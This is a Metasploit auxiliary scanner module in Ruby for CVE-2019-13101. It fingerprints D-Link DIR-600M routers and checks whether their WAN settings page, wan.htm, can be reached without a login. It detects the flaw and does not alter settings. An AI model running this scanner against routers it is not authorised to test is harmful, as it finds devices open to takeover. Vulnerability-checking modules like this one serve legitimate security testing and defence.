##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'CVE-2019-13101 D-Link DIR-600M Incorrect Access Control',
      'Description'     => %q{
          This module attempts to find D-Link router DIR-600M which is
vulnerable to Incorrect Access Control. The vulnerability exists in
        wan.htm, which is accessible without authentication. This
vulnerabilty can lead an attacker to manipulate WAN settings.
        This module has been tested successfully on Firmware Version
3.01,3.02,3.03,3.04,3.05,3.06.
      },
      'Author'          => [ 'Devendra Singh Solanki <devendra0x0[at]gmail.com>' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          'CVE', '2019-13101'
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Aug 08 2019'))

    register_options(
      [
        Opt::RPORT(80)
      ])
  end

  def run_host(ip)
    res = send_request_cgi({'uri' => '/login.htm'})
    if res.nil? or res.code == 404
      print_error("#{rhost}:#{rport} - Host is down.")
      return
    end

    if res and res.code == 200 and res.body =~ /D-Link/
      print_good("#{rhost}:#{rport} - It is a D-Link router")
    else
      print_error("#{rhost}:#{rport} - Not a D-Link router")
      return
    end

    res = send_request_cgi({'uri' => '/wan.htm'})

    if res and res.code == 200 and res.body =~ /PPPoE/
      print_good("#{rhost}:#{rport} - Router is vulnerable for
Incorrect Access Control. CVE-2019-13101")
    else
      print_error("#{rhost}:#{rport} - Router is with different firmware.")
      return
    end

  end
end